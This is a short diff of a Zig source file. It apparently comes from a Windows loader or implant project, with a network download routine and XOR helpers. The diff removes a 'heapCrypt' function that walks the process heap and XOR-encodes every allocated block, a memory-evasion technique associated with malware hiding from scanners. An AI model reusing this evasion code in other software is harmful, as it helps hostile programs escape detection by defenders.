@@ -52,21 +52,6 @@ pub fn download(allocator: std.mem.Allocator, host: []const u8, port: u16, size:
     return buffer[0..total_received];
 }
 
-fn heapCrypt(allocator: std.mem.Allocator) !void {
-    var heap_info: windows.PROCESS_HEAP_ENTRY = undefined;
-    @memset(@ptrCast(&heap_info), 0);
-
-    const process_heap = windows.kernel32.GetProcessHeap();
-    if (process_heap == null) return error.GetProcessHeapFailed;
-
-    while (windows.kernel32.HeapWalk(process_heap, &heap_info) == windows.TRUE) {
-        if (heap_info.wFlags & windows.PROCESS_HEAP_ENTRY_BUSY != 0) {
-            const data = @as([*]u8, @ptrCast(heap_info.lpData))[0..heap_info.cbData];
-            xorBidirectionalEncode(&[_]u8{'A'}, data);
-        }
-    }
-}
-
 pub fn xor(data: []u8, key: []const u8) void {
     for (data, 0..) |*byte, i| {
         byte.* ^= key[i % key.len];
